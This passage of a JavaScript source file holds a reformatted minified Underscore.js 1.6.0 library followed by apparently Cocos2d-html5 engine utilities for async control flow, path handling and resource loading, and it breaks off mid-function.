﻿(function() {
	var n = this,
		t = n._,
		r = {},
		e = Array.prototype,
		u = Object.prototype,
		i = Function.prototype,
		a = e.push,
		o = e.slice,
		c = e.concat,
		l = u.toString,
		f = u.hasOwnProperty,
		s = e.forEach,
		p = e.map,
		h = e.reduce,
		v = e.reduceRight,
		g = e.filter,
		d = e.every,
		m = e.some,
		y = e.indexOf,
		b = e.lastIndexOf,
		x = Array.isArray,
		w = Object.keys,
		_ = i.bind,
		j = function(n) {
			return n instanceof j ? n : this instanceof j ? void(this._wrapped = n) : new j(n)
		};
	"undefined" != typeof exports ? ("undefined" != typeof module && module.exports && (exports = module.exports = j), exports._ = j) : n._ = j, j.VERSION = "1.6.0";
	var A = j.each = j.forEach = function(n, t, e) {
			if (null == n) return n;
			if (s && n.forEach === s) n.forEach(t, e);
			else if (n.length === +n.length) {
				for (var u = 0, i = n.length; i > u; u++) if (t.call(e, n[u], u, n) === r) return
			} else for (var a = j.keys(n), u = 0, i = a.length; i > u; u++) if (t.call(e, n[a[u]], a[u], n) === r) return;
			return n
		};
	j.map = j.collect = function(n, t, r) {
		var e = [];
		return null == n ? e : p && n.map === p ? n.map(t, r) : (A(n, function(n, u, i) {
			e.push(t.call(r, n, u, i))
		}), e)
	};
	var O = "Reduce of empty array with no initial value";
	j.reduce = j.foldl = j.inject = function(n, t, r, e) {
		var u = arguments.length > 2;
		if (null == n && (n = []), h && n.reduce === h) return e && (t = j.bind(t, e)), u ? n.reduce(t, r) : n.reduce(t);
		if (A(n, function(n, i, a) {
			u ? r = t.call(e, r, n, i, a) : (r = n, u = !0)
		}), !u) throw new TypeError(O);
		return r
	}, j.reduceRight = j.foldr = function(n, t, r, e) {
		var u = arguments.length > 2;
		if (null == n && (n = []), v && n.reduceRight === v) return e && (t = j.bind(t, e)), u ? n.reduceRight(t, r) : n.reduceRight(t);
		var i = n.length;
		if (i !== +i) {
			var a = j.keys(n);
			i = a.length
		}
		if (A(n, function(o, c, l) {
			c = a ? a[--i] : --i, u ? r = t.call(e, r, n[c], c, l) : (r = n[c], u = !0)
		}), !u) throw new TypeError(O);
		return r
	}, j.find = j.detect = function(n, t, r) {
		var e;
		return k(n, function(n, u, i) {
			return t.call(r, n, u, i) ? (e = n, !0) : void 0
		}), e
	}, j.filter = j.select = function(n, t, r) {
		var e = [];
		return null == n ? e : g && n.filter === g ? n.filter(t, r) : (A(n, function(n, u, i) {
			t.call(r, n, u, i) && e.push(n)
		}), e)
	}, j.reject = function(n, t, r) {
		return j.filter(n, function(n, e, u) {
			return !t.call(r, n, e, u)
		}, r)
	}, j.every = j.all = function(n, t, e) {
		t || (t = j.identity);
		var u = !0;
		return null == n ? u : d && n.every === d ? n.every(t, e) : (A(n, function(n, i, a) {
			return (u = u && t.call(e, n, i, a)) ? void 0 : r
		}), !! u)
	};
	var k = j.some = j.any = function(n, t, e) {
			t || (t = j.identity);
			var u = !1;
			return null == n ? u : m && n.some === m ? n.some(t, e) : (A(n, function(n, i, a) {
				return u || (u = t.call(e, n, i, a)) ? r : void 0
			}), !! u)
		};
	j.contains = j.include = function(n, t) {
		return null == n ? !1 : y && n.indexOf === y ? n.indexOf(t) != -1 : k(n, function(n) {
			return n === t
		})
	}, j.invoke = function(n, t) {
		var r = o.call(arguments, 2),
			e = j.isFunction(t);
		return j.map(n, function(n) {
			return (e ? t : n[t]).apply(n, r)
		})
	}, j.pluck = function(n, t) {
		return j.map(n, j.property(t))
	}, j.where = function(n, t) {
		return j.filter(n, j.matches(t))
	}, j.findWhere = function(n, t) {
		return j.find(n, j.matches(t))
	}, j.max = function(n, t, r) {
		if (!t && j.isArray(n) && n[0] === +n[0] && n.length < 65535) return Math.max.apply(Math, n);
		var e = -1 / 0,
			u = -1 / 0;
		return A(n, function(n, i, a) {
			var o = t ? t.call(r, n, i, a) : n;
			o > u && (e = n, u = o)
		}), e
	}, j.min = function(n, t, r) {
		if (!t && j.isArray(n) && n[0] === +n[0] && n.length < 65535) return Math.min.apply(Math, n);
		var e = 1 / 0,
			u = 1 / 0;
		return A(n, function(n, i, a) {
			var o = t ? t.call(r, n, i, a) : n;
			u > o && (e = n, u = o)
		}), e
	}, j.shuffle = function(n) {
		var t, r = 0,
			e = [];
		return A(n, function(n) {
			t = j.random(r++), e[r - 1] = e[t], e[t] = n
		}), e
	}, j.sample = function(n, t, r) {
		return null == t || r ? (n.length !== +n.length && (n = j.values(n)), n[j.random(n.length - 1)]) : j.shuffle(n).slice(0, Math.max(0, t))
	};
	var E = function(n) {
			return null == n ? j.identity : j.isFunction(n) ? n : j.property(n)
		};
	j.sortBy = function(n, t, r) {
		return t = E(t), j.pluck(j.map(n, function(n, e, u) {
			return {
				value: n,
				index: e,
				criteria: t.call(r, n, e, u)
			}
		}).sort(function(n, t) {
			var r = n.criteria,
				e = t.criteria;
			if (r !== e) {
				if (r > e || r === void 0) return 1;
				if (e > r || e === void 0) return -1
			}
			return n.index - t.index
		}), "value")
	};
	var F = function(n) {
			return function(t, r, e) {
				var u = {};
				return r = E(r), A(t, function(i, a) {
					var o = r.call(e, i, a, t);
					n(u, o, i)
				}), u
			}
		};
	j.groupBy = F(function(n, t, r) {
		j.has(n, t) ? n[t].push(r) : n[t] = [r]
	}), j.indexBy = F(function(n, t, r) {
		n[t] = r
	}), j.countBy = F(function(n, t) {
		j.has(n, t) ? n[t]++ : n[t] = 1
	}), j.sortedIndex = function(n, t, r, e) {
		r = E(r);
		for (var u = r.call(e, t), i = 0, a = n.length; a > i;) {
			var o = i + a >>> 1;
			r.call(e, n[o]) < u ? i = o + 1 : a = o
		}
		return i
	}, j.toArray = function(n) {
		return n ? j.isArray(n) ? o.call(n) : n.length === +n.length ? j.map(n, j.identity) : j.values(n) : []
	}, j.size = function(n) {
		return null == n ? 0 : n.length === +n.length ? n.length : j.keys(n).length
	}, j.first = j.head = j.take = function(n, t, r) {
		return null == n ? void 0 : null == t || r ? n[0] : 0 > t ? [] : o.call(n, 0, t)
	}, j.initial = function(n, t, r) {
		return o.call(n, 0, n.length - (null == t || r ? 1 : t))
	}, j.last = function(n, t, r) {
		return null == n ? void 0 : null == t || r ? n[n.length - 1] : o.call(n, Math.max(n.length - t, 0))
	}, j.rest = j.tail = j.drop = function(n, t, r) {
		return o.call(n, null == t || r ? 1 : t)
	}, j.compact = function(n) {
		return j.filter(n, j.identity)
	};
	var M = function(n, t, r) {
			return t && j.every(n, j.isArray) ? c.apply(r, n) : (A(n, function(n) {
				j.isArray(n) || j.isArguments(n) ? t ? a.apply(r, n) : M(n, t, r) : r.push(n)
			}), r)
		};
	j.flatten = function(n, t) {
		return M(n, t, [])
	}, j.without = function(n) {
		return j.difference(n, o.call(arguments, 1))
	}, j.partition = function(n, t) {
		var r = [],
			e = [];
		return A(n, function(n) {
			(t(n) ? r : e).push(n)
		}), [r, e]
	}, j.uniq = j.unique = function(n, t, r, e) {
		j.isFunction(t) && (e = r, r = t, t = !1);
		var u = r ? j.map(n, r, e) : n,
			i = [],
			a = [];
		return A(u, function(r, e) {
			(t ? e && a[a.length - 1] === r : j.contains(a, r)) || (a.push(r), i.push(n[e]))
		}), i
	}, j.union = function() {
		return j.uniq(j.flatten(arguments, !0))
	}, j.intersection = function(n) {
		var t = o.call(arguments, 1);
		return j.filter(j.uniq(n), function(n) {
			return j.every(t, function(t) {
				return j.contains(t, n)
			})
		})
	}, j.difference = function(n) {
		var t = c.apply(e, o.call(arguments, 1));
		return j.filter(n, function(n) {
			return !j.contains(t, n)
		})
	}, j.zip = function() {
		for (var n = j.max(j.pluck(arguments, "length").concat(0)), t = new Array(n), r = 0; n > r; r++) t[r] = j.pluck(arguments, "" + r);
		return t
	}, j.object = function(n, t) {
		if (null == n) return {};
		for (var r = {}, e = 0, u = n.length; u > e; e++) t ? r[n[e]] = t[e] : r[n[e][0]] = n[e][1];
		return r
	}, j.indexOf = function(n, t, r) {
		if (null == n) return -1;
		var e = 0,
			u = n.length;
		if (r) {
			if ("number" != typeof r) return e = j.sortedIndex(n, t), n[e] === t ? e : -1;
			e = 0 > r ? Math.max(0, u + r) : r
		}
		if (y && n.indexOf === y) return n.indexOf(t, r);
		for (; u > e; e++) if (n[e] === t) return e;
		return -1
	}, j.lastIndexOf = function(n, t, r) {
		if (null == n) return -1;
		var e = null != r;
		if (b && n.lastIndexOf === b) return e ? n.lastIndexOf(t, r) : n.lastIndexOf(t);
		for (var u = e ? r : n.length; u--;) if (n[u] === t) return u;
		return -1
	}, j.range = function(n, t, r) {
		arguments.length <= 1 && (t = n || 0, n = 0), r = arguments[2] || 1;
		for (var e = Math.max(Math.ceil((t - n) / r), 0), u = 0, i = new Array(e); e > u;) i[u++] = n, n += r;
		return i
	};
	var R = function() {};
	j.bind = function(n, t) {
		var r, e;
		if (_ && n.bind === _) return _.apply(n, o.call(arguments, 1));
		if (!j.isFunction(n)) throw new TypeError;
		return r = o.call(arguments, 2), e = function() {
			if (!(this instanceof e)) return n.apply(t, r.concat(o.call(arguments)));
			R.prototype = n.prototype;
			var u = new R;
			R.prototype = null;
			var i = n.apply(u, r.concat(o.call(arguments)));
			return Object(i) === i ? i : u
		}
	}, j.partial = function(n) {
		var t = o.call(arguments, 1);
		return function() {
			for (var r = 0, e = t.slice(), u = 0, i = e.length; i > u; u++) e[u] === j && (e[u] = arguments[r++]);
			for (; r < arguments.length;) e.push(arguments[r++]);
			return n.apply(this, e)
		}
	}, j.bindAll = function(n) {
		var t = o.call(arguments, 1);
		if (0 === t.length) throw new Error("bindAll must be passed function names");
		return A(t, function(t) {
			n[t] = j.bind(n[t], n)
		}), n
	}, j.memoize = function(n, t) {
		var r = {};
		return t || (t = j.identity), function() {
			var e = t.apply(this, arguments);
			return j.has(r, e) ? r[e] : r[e] = n.apply(this, arguments)
		}
	}, j.delay = function(n, t) {
		var r = o.call(arguments, 2);
		return setTimeout(function() {
			return n.apply(null, r)
		}, t)
	}, j.defer = function(n) {
		return j.delay.apply(j, [n, 1].concat(o.call(arguments, 1)))
	}, j.throttle = function(n, t, r) {
		var e, u, i, a = null,
			o = 0;
		r || (r = {});
		var c = function() {
				o = r.leading === !1 ? 0 : j.now(), a = null, i = n.apply(e, u), e = u = null
			};
		return function() {
			var l = j.now();
			o || r.leading !== !1 || (o = l);
			var f = t - (l - o);
			return e = this, u = arguments, 0 >= f ? (clearTimeout(a), a = null, o = l, i = n.apply(e, u), e = u = null) : a || r.trailing === !1 || (a = setTimeout(c, f)), i
		}
	}, j.debounce = function(n, t, r) {
		var e, u, i, a, o, c = function() {
				var l = j.now() - a;
				t > l ? e = setTimeout(c, t - l) : (e = null, r || (o = n.apply(i, u), i = u = null))
			};
		return function() {
			i = this, u = arguments, a = j.now();
			var l = r && !e;
			return e || (e = setTimeout(c, t)), l && (o = n.apply(i, u), i = u = null), o
		}
	}, j.once = function(n) {
		var t, r = !1;
		return function() {
			return r ? t : (r = !0, t = n.apply(this, arguments), n = null, t)
		}
	}, j.wrap = function(n, t) {
		return j.partial(t, n)
	}, j.compose = function() {
		var n = arguments;
		return function() {
			for (var t = arguments, r = n.length - 1; r >= 0; r--) t = [n[r].apply(this, t)];
			return t[0]
		}
	}, j.after = function(n, t) {
		return function() {
			return --n < 1 ? t.apply(this, arguments) : void 0
		}
	}, j.keys = function(n) {
		if (!j.isObject(n)) return [];
		if (w) return w(n);
		var t = [];
		for (var r in n) j.has(n, r) && t.push(r);
		return t
	}, j.values = function(n) {
		for (var t = j.keys(n), r = t.length, e = new Array(r), u = 0; r > u; u++) e[u] = n[t[u]];
		return e
	}, j.pairs = function(n) {
		for (var t = j.keys(n), r = t.length, e = new Array(r), u = 0; r > u; u++) e[u] = [t[u], n[t[u]]];
		return e
	}, j.invert = function(n) {
		for (var t = {}, r = j.keys(n), e = 0, u = r.length; u > e; e++) t[n[r[e]]] = r[e];
		return t
	}, j.functions = j.methods = function(n) {
		var t = [];
		for (var r in n) j.isFunction(n[r]) && t.push(r);
		return t.sort()
	}, j.extend = function(n) {
		return A(o.call(arguments, 1), function(t) {
			if (t) for (var r in t) n[r] = t[r]
		}), n
	}, j.pick = function(n) {
		var t = {},
			r = c.apply(e, o.call(arguments, 1));
		return A(r, function(r) {
			r in n && (t[r] = n[r])
		}), t
	}, j.omit = function(n) {
		var t = {},
			r = c.apply(e, o.call(arguments, 1));
		for (var u in n) j.contains(r, u) || (t[u] = n[u]);
		return t
	}, j.defaults = function(n) {
		return A(o.call(arguments, 1), function(t) {
			if (t) for (var r in t) n[r] === void 0 && (n[r] = t[r])
		}), n
	}, j.clone = function(n) {
		return j.isObject(n) ? j.isArray(n) ? n.slice() : j.extend({}, n) : n
	}, j.tap = function(n, t) {
		return t(n), n
	};
	var S = function(n, t, r, e) {
			if (n === t) return 0 !== n || 1 / n == 1 / t;
			if (null == n || null == t) return n === t;
			n instanceof j && (n = n._wrapped), t instanceof j && (t = t._wrapped);
			var u = l.call(n);
			if (u != l.call(t)) return !1;
			switch (u) {
			case "[object String]":
				return n == String(t);
			case "[object Number]":
				return n != +n ? t != +t : 0 == n ? 1 / n == 1 / t : n == +t;
			case "[object Date]":
			case "[object Boolean]":
				return +n == +t;
			case "[object RegExp]":
				return n.source == t.source && n.global == t.global && n.multiline == t.multiline && n.ignoreCase == t.ignoreCase
			}
			if ("object" != typeof n || "object" != typeof t) return !1;
			for (var i = r.length; i--;) if (r[i] == n) return e[i] == t;
			var a = n.constructor,
				o = t.constructor;
			if (a !== o && !(j.isFunction(a) && a instanceof a && j.isFunction(o) && o instanceof o) && "constructor" in n && "constructor" in t) return !1;
			r.push(n), e.push(t);
			var c = 0,
				f = !0;
			if ("[object Array]" == u) {
				if (c = n.length, f = c == t.length) for (; c-- && (f = S(n[c], t[c], r, e)););
			} else {
				for (var s in n) if (j.has(n, s) && (c++, !(f = j.has(t, s) && S(n[s], t[s], r, e)))) break;
				if (f) {
					for (s in t) if (j.has(t, s) && !c--) break;
					f = !c
				}
			}
			return r.pop(), e.pop(), f
		};
	j.isEqual = function(n, t) {
		return S(n, t, [], [])
	}, j.isEmpty = function(n) {
		if (null == n) return !0;
		if (j.isArray(n) || j.isString(n)) return 0 === n.length;
		for (var t in n) if (j.has(n, t)) return !1;
		return !0
	}, j.isElement = function(n) {
		return !(!n || 1 !== n.nodeType)
	}, j.isArray = x ||
	function(n) {
		return "[object Array]" == l.call(n)
	}, j.isObject = function(n) {
		return n === Object(n)
	}, A(["Arguments", "Function", "String", "Number", "Date", "RegExp"], function(n) {
		j["is" + n] = function(t) {
			return l.call(t) == "[object " + n + "]"
		}
	}), j.isArguments(arguments) || (j.isArguments = function(n) {
		return !(!n || !j.has(n, "callee"))
	}), "function" != typeof / . / && (j.isFunction = function(n) {
		return "function" == typeof n
	}), j.isFinite = function(n) {
		return isFinite(n) && !isNaN(parseFloat(n))
	}, j.isNaN = function(n) {
		return j.isNumber(n) && n != +n
	}, j.isBoolean = function(n) {
		return n === !0 || n === !1 || "[object Boolean]" == l.call(n)
	}, j.isNull = function(n) {
		return null === n
	}, j.isUndefined = function(n) {
		return n === void 0
	}, j.has = function(n, t) {
		return f.call(n, t)
	}, j.noConflict = function() {
		return n._ = t, this
	}, j.identity = function(n) {
		return n
	}, j.constant = function(n) {
		return function() {
			return n
		}
	}, j.property = function(n) {
		return function(t) {
			return t[n]
		}
	}, j.matches = function(n) {
		return function(t) {
			if (t === n) return !0;
			for (var r in n) if (n[r] !== t[r]) return !1;
			return !0
		}
	}, j.times = function(n, t, r) {
		for (var e = Array(Math.max(0, n)), u = 0; n > u; u++) e[u] = t.call(r, u);
		return e
	}, j.random = function(n, t) {
		return null == t && (t = n, n = 0), n + Math.floor(Math.random() * (t - n + 1))
	}, j.now = Date.now ||
	function() {
		return (new Date).getTime()
	};
	var T = {
		escape: {
			"&": "&amp;",
			"<": "&lt;",
			">": "&gt;",
			'"': "&quot;",
			"'": "&#x27;"
		}
	};
	T.unescape = j.invert(T.escape);
	var I = {
		escape: new RegExp("[" + j.keys(T.escape).join("") + "]", "g"),
		unescape: new RegExp("(" + j.keys(T.unescape).join("|") + ")", "g")
	};
	j.each(["escape", "unescape"], function(n) {
		j[n] = function(t) {
			return null == t ? "" : ("" + t).replace(I[n], function(t) {
				return T[n][t]
			})
		}
	}), j.result = function(n, t) {
		if (null == n) return void 0;
		var r = n[t];
		return j.isFunction(r) ? r.call(n) : r
	}, j.mixin = function(n) {
		A(j.functions(n), function(t) {
			var r = j[t] = n[t];
			j.prototype[t] = function() {
				var n = [this._wrapped];
				return a.apply(n, arguments), z.call(this, r.apply(j, n))
			}
		})
	};
	var N = 0;
	j.uniqueId = function(n) {
		var t = ++N + "";
		return n ? n + t : t
	}, j.templateSettings = {
		evaluate: /<%([\s\S]+?)%>/g,
		interpolate: /<%=([\s\S]+?)%>/g,
		escape: /<%-([\s\S]+?)%>/g
	};
	var q = /(.)^/,
		B = {
			"'": "'",
			"\\": "\\",
			"\r": "r",
			"\n": "n",
			"  ": "t",
			"\u2028": "u2028",
			"\u2029": "u2029"
		},
		D = /\\|'|\r|\n|\t|\u2028|\u2029/g;
	j.template = function(n, t, r) {
		var e;
		r = j.defaults({}, r, j.templateSettings);
		var u = new RegExp([(r.escape || q).source, (r.interpolate || q).source, (r.evaluate || q).source].join("|") + "|$", "g"),
			i = 0,
			a = "__p+='";
		n.replace(u, function(t, r, e, u, o) {
			return a += n.slice(i, o).replace(D, function(n) {
				return "\\" + B[n]
			}), r && (a += "'+\n((__t=(" + r + "))==null?'':_.escape(__t))+\n'"), e && (a += "'+\n((__t=(" + e + "))==null?'':__t)+\n'"), u && (a += "';\n" + u + "\n__p+='"), i = o + t.length, t
		}), a += "';\n", r.variable || (a = "with(obj||{}){\n" + a + "}\n"), a = "var __t,__p='',__j=Array.prototype.join," + "print=function(){__p+=__j.call(arguments,'');};\n" + a + "return __p;\n";
		try {
			e = new Function(r.variable || "obj", "_", a)
		} catch (o) {
			throw o.source = a, o
		}
		if (t) return e(t, j);
		var c = function(n) {
				return e.call(this, n, j)
			};
		return c.source = "function(" + (r.variable || "obj") + "){\n" + a + "}", c
	}, j.chain = function(n) {
		return j(n).chain()
	};
	var z = function(n) {
			return this._chain ? j(n).chain() : n
		};
	j.mixin(j), A(["pop", "push", "reverse", "shift", "sort", "splice", "unshift"], function(n) {
		var t = e[n];
		j.prototype[n] = function() {
			var r = this._wrapped;
			return t.apply(r, arguments), "shift" != n && "splice" != n || 0 !== r.length || delete r[0], z.call(this, r)
		}
	}), A(["concat", "join", "slice"], function(n) {
		var t = e[n];
		j.prototype[n] = function() {
			return z.call(this, t.apply(this._wrapped, arguments))
		}
	}), j.extend(j.prototype, {
		chain: function() {
			return this._chain = !0, this
		},
		value: function() {
			return this._wrapped
		}
	}), "function" == typeof define && define.amd && define("underscore", [], function() {
		return j
	})
}).call(this);
var cc = cc || {};
cc._tmp = cc._tmp || {};
cc._LogInfos = {};
_p = window;
_p = Object.prototype;
delete window._p;
cc.newElement = function(a) {
	return document.createElement(a)
};
cc._addEventListener = function(a, b, c, d) {
	a.addEventListener(b, c, d)
};
cc._isNodeJs = "undefined" !== typeof require && require("fs");
cc.each = function(a, b, c) {
	if (a) if (a instanceof Array) for (var d = 0, e = a.length; d < e && !1 !== b.call(c, a[d], d); d++);
	else for (d in a) if (!1 === b.call(c, a[d], d)) break
};
cc.isCrossOrigin = function(a) {
	if (!a) return cc.log("invalid URL"), !1;
	var b = a.indexOf("://");
	if (-1 == b) return !1;
	b = a.indexOf("/", b + 3);
	return (-1 == b ? a : a.substring(0, b)) != location.origin
};
cc.async = {
	_counterFunc: function(a) {
		var b = this.counter;
		if (!b.err) {
			var c = b.length,
				d = b.results,
				e = b.option,
				f = e.cb,
				g = e.cbTarget,
				h = e.trigger,
				e = e.triggerTarget;
			if (a) {
				if (b.err = a, f) return f.call(g, a)
			} else {
				var k = Array.apply(null, arguments).slice(1),
					l = k.length;
				0 == l ? k = null : 1 == l && (k = k[0]);
				d[this.index] = k;
				b.count--;
				h && h.call(e, k, c - b.count, c);
				0 == b.count && f && f.apply(g, [null, d])
			}
		}
	},
	_emptyFunc: function() {},
	parallel: function(a, b, c) {
		var d = cc.async;
		if (void 0 !== c)"function" == typeof b && (b = {
			trigger: b
		}), b.cb = c || b.cb;
		else if (void 0 !== b)"function" == typeof b && (b = {
			cb: b
		});
		else if (void 0 !== a) b = {};
		else throw "arguments error!";
		var e = (c = a instanceof Array) ? a.length : Object.keys(a).length;
		if (0 == e) b.cb && b.cb.call(b.cbTarget, null);
		else {
			var f = {
				length: e,
				count: e,
				option: b,
				results: c ? [] : {}
			};
			cc.each(a, function(a, c) {
				if (f.err) return !1;
				var e = !b.cb && !b.trigger ? d._emptyFunc : d._counterFunc.bind({
					counter: f,
					index: c
				});
				a(e, c)
			})
		}
	},
	map: function(a, b, c) {
		var d = this,
			e = arguments.length;
		"function" == typeof b && (b = {
			iterator: b
		});
		if (3 === e) b.cb = c || b.cb;
		else if (2 > e) throw "arguments error!";
		"function" == typeof b && (b = {
			iterator: b
		});
		if (void 0 !== c) b.cb = c || b.cb;
		else if (void 0 === a) throw "arguments error!";
		var f = (e = a instanceof Array) ? a.length : Object.keys(a).length;
		if (0 === f) b.cb && b.cb.call(b.cbTarget, null);
		else {
			var g = {
				length: f,
				count: f,
				option: b,
				results: e ? [] : {}
			};
			cc.each(a, function(a, c) {
				if (g.err) return !1;
				var e = !b.cb ? d._emptyFunc : d._counterFunc.bind({
					counter: g,
					index: c
				});
				b.iterator.call(b.iteratorTarget, a, c, e)
			})
		}
	}
};
cc.path = {
	join: function() {
		for (var a = arguments.length, b = "", c = 0; c < a; c++) b = (b + ("" == b ? "" : "/") + arguments[c]).replace(/(\/|\\\\)$/, "");
		return b
	},
	extname: function(a) {
		return (a = /(\.[^\.\/\?\\]*)(\?.*)?$/.exec(a)) ? a[1] : null
	},
	mainFileName: function(a) {
		if (a) {
			var b = a.lastIndexOf(".");
			if (-1 !== b) return a.substring(0, b)
		}
		return a
	},
	basename: function(a, b) {
		var c = a.indexOf("?");
		0 < c && (a = a.substring(0, c));
		c = /(\/|\\\\)([^(\/|\\\\)]+)$/g.exec(a.replace(/(\/|\\\\)$/, ""));
		if (!c) return null;
		c = c[2];
		return b && a.substring(a.length - b.length).toLowerCase() == b.toLowerCase() ? c.substring(0, c.length - b.length) : c
	},
	dirname: function(a) {
		return a.replace(/((.*)(\/|\\|\\\\))?(.*?\..*$)?/, "$2")
	},
	changeExtname: function(a, b) {
		b = b || "";
		var c = a.indexOf("?"),
			d = "";
		0 < c && (d = a.substring(c), a = a.substring(0, c));
		c = a.lastIndexOf(".");
		return 0 > c ? a + b + d : a.substring(0, c) + b + d
	},
	changeBasename: function(a, b, c) {
		if (0 == b.indexOf(".")) return this.changeExtname(a, b);
		var d = a.indexOf("?"),
			e = "";
		c = c ? this.extname(a) : "";
		0 < d && (e = a.substring(d), a = a.substring(0, d));
		d = a.lastIndexOf("/");
		return a.substring(0, 0 >= d ? 0 : d + 1) + b + c + e
	}
};
cc.loader = {
	_jsCache: {},
	_register: {},
	_langPathCache: {},
	_aliases: {},
	resPath: "res",
	audioPath: "res",
	cache: {},
	getXMLHttpRequest: function() {
		return window.XMLHttpRequest ? new window.XMLHttpRequest : new ActiveXObject("MSXML2.XMLHTTP")
	},
	_getArgs4Js: function(a) {
		var b = a[0],
			c = a[1],
			d = a[2],
			e = ["", null, null];
		if (1 === a.length) e[1] = b instanceof Array ? b : [b];
		else if (2 === a.length)"function" == typeof c ? (e[1] = b instanceof Array ? b : [b], e[2] = c) : (e[0] = b || "", e[1] = c instanceof Array ? c : [c]);
		else if (3 === a.length) e[0] = b || "", e[1] = c instanceof Array ? c : [c], e[2] = d;
		else throw "arguments error to load js!";
		return e
	},
	loadJs: function(a, b, c) {
		var d = this,
			e = d._jsCache,
			f = d._getArgs4Js(arguments); - 1 < navigator.userAgent.indexOf("Trident/5") ? d._loadJs4Dependency(f[0], f[1], 0, f[2]) : cc.async.map(f[1], function(a, b, c) {
			a = cc.path.join(f[0], a);
			if (e[a]) return c(null);
			d._createScript(a, !1, c)
		}, f[2])
	},
	loadJsWithImg: function(a, b, c) {
		var d = this._loadJsImg(),
			e = this._getArgs4Js(arguments);
		this.loadJs(e[0], e[1], function(a) {
			if (a) throw a;
			d.parentNode.removeChild(d);
			if (e[2]) e[2]()
		})
	},
	_createScript: function(a, b, c) {
		var d = document,
			e = cc.newElement("script");
		e.async = b;
		e.src = a;
		this._jsCache[a] = !0;
		cc._addEventListener(e, "load", function() {
			this.removeEventListener("load", arguments.callee, !1);
			c()
		}, !1);
		cc._addEventListener(e, "error", function() {
			c("Load " + a + " failed!")
		}, !1);
		d.body.appendChild(e)
	},
	_loadJs4Dependency: function(a, b, c, d) {
		if (c >= b.length) d && d();
		else {
			var e = this;
			e._createScript(cc.path.join(a, b[c]), !1, function(f) {
				if (f) return d(f);
				e._loadJs4Dependency(a, b, c + 1, d)
			})
		}
	},
	_loadJsImg: function() {
		var a = document,
			b = a.getElementById("cocos2d_loadJsImg");
		if (!b) {
			b = cc.newElement("img");
			cc._loadingImage && (b.src = cc._loadingImage);
			a = a.getElementById(cc.game.config.id);
			a.style.backgroundColor = "black";
			a.parentNode.appendChild(b);
			var c = getComputedStyle ? getComputedStyle(a) : a.currentStyle;
			c || (c = {
				width: a.width,
				height: a.height
			});
			b.style.left = a.offsetLeft + (parseFloat(c.width) - b.width) / 2 + "px";
			b.style.top = a.offsetTop + (parseFloat(c.height) - b.height) / 2 + "px";
			b.style.position = "absolute"
		}
		return b
	},
	loadTxt: function(a, b) {
		if (cc._isNodeJs) require("fs").readFile(a, function(a, c) {
			a ? b(a) : b(null, c.toString())
		});
		else {
			var c = this.getXMLHttpRequest(),
				d = "load " + a + " failed!";
			c.open("GET", a, !0);
			/msie/i.test(navigator.userAgent) && !/opera/i.test(navigator.userAgent) ? (c.setRequestHeader("Accept-Charset", "utf-8"), c.onreadystatechange = function() {
				4 == c.readyState && 200 == c.status ? b(null, c.responseText) : b(d)
			}) : (c.overrideMimeType && c.overrideMimeType("text/plain; charset\x3dutf-8"), c.onload = function() {
				4 == c.readyState && 200 == c.status ? b(null, c.responseText) : b(d)
			});
			c.send(null)
		}
	},
	_loadTxtSync: function(a) {
		if (cc._isNodeJs) return require("fs").readFileSync(a).toString();
		var b = this.getXMLHttpRequest();
		b.open("GET", a, !1);
		/msie/i.test(navigator.userAgent) && !/opera/i.test(navigator.userAgent) ? b.setRequestHeader("Accept-Charset", "utf-8") : b.overrideMimeType && b.overrideMimeType("text/plain; charset\x3dutf-8");
		b.send(null);
		return 4 == !b.readyState || 200 != b.status ? null : b.responseText
	},
	loadJson: function(a, b) {
		this.loadTxt(a, function(c, d) {
			try {
				c ? b(c) : b(null, JSON.parse(d))
			} catch (e) {
				throw "load json [" + a + "] failed : " + e;
			}
		})
	},
	_checkIsImageURL: function(a) {
		return null != /(\.png)|(\.jpg)|(\.bmp)|(\.jpeg)|(\.gif)/.exec(a)
	},
	loadImg: function(a, b, c) {
		var d = !0;
		void 0 !== c ? d = null == b.isCrossOrigin ? d : b.isCrossOrigin : void 0 !== b && (c = b);
		var e = new Image;
		d && "file://" != location.origin && (e.crossOrigin = "Anonymous");
		cc._addEventListener(e, "load", function() {
			this.removeEventListener("load", arguments.callee, !1);
			this.removeEventListener("error", arguments.callee, !1);
			c && c(null, e)
		});
		cc._addEventListener(e, "error", function() {
			this.removeEventListener("error", arguments.callee, !1);
			c && c("load image failed")
		});
		e.src = a;
		return e
	},
	_loadResIterator: function(a, b, c) {
		var d = this,
			e = null,
			f = a.type;
		f ? (f = "." + f.toLowerCase(), e = a.src ? a.src : a.name + f) : (e = a, f = cc.path.extname(e));
		if (b = d.cache[e]) return c(null, b);
		b = d._register[f.toLowerCase()];
		if (!b) return cc.error("loader for [" + f + "] not exists!"), c();
		f = b.getBasePath ? b.getBasePath() : d.resPath;
		f = d.getUrl(f, e);
		b.load(f, e, a, function(a, b) {
			a ? (cc.log(a), d.cache[e] = null, delete d.cache[e], c()) : (d.cache[e] = b, c(null, b))
		})
	},
	getUrl: function(a, b) {
		var c = this._langPathCache,
			d = cc.path;
		if (void 0 !== a && void 0 === b) {
			b = a;
			var e = d.extname(b),
				e = e ? e.toLowerCase() : "";
			a = (e = this._register[e]) ? e.getBasePath ? e.getBasePath() : this.resPath : this.resPath
		}
		b = cc.path.join(a || "", b);
		if (b.match(/[\/(\\\\)]lang[\/(\\\\)]/i)) {
			if (c[b]) return c[b];
			d = d.extname(b) || "";
			b = c[b] = b.substring(0, b.length - d.length) + "_" + cc.sys.language + d
		}
		return b
	},
	load: function(a, b, c) {
		if (void 0 !== c)"function" == typeof b && (b = {
			trigger: b
		});
		else if (void 0 !== b)"function" == typeof b && (c = b, b = {});
		else if (void 0 !== a) b = {};
		else throw "arguments error!";
		b.cb = function(a, b) {
			a && cc.log(a);
			c && c(b)
		};
		a instanceof Array || (a = [a]);
		b.iterator = this._loadResIterator;
		b.iteratorTarget = this;
		cc.async.map(a, b)
	},
	_handleAliases: function(a, b) {
		var c = this._aliases,
			d = [],
			e;
		for (e in a) {
			var f = a[e];
			c[e] = f;
			d.push(f)
		}
		this.load(d, b)
	},
	loadAliases: function(a, b) {
		var c = this,
			d = c.getRes(a);
		d ? c._handleAliases(d.filenames, b) : c.load(a, function(a) {
			c._handleAliases(a[0].filenames, b)
		})
	},
	register: function(a, b) {
		if (a && b) {
			if ("string" == typeof a) return this._register[a.trim().toLowerCase()] = b;
			for (var c = 0, d = a.length; c < d; c++) this._register["." + a[c].trim().toLowerCase()] = b
		}
	},
	getRes: function(a) {
		return this.cache[a] || this.cache[this._aliases[a]]
	},
	release: function(a) {
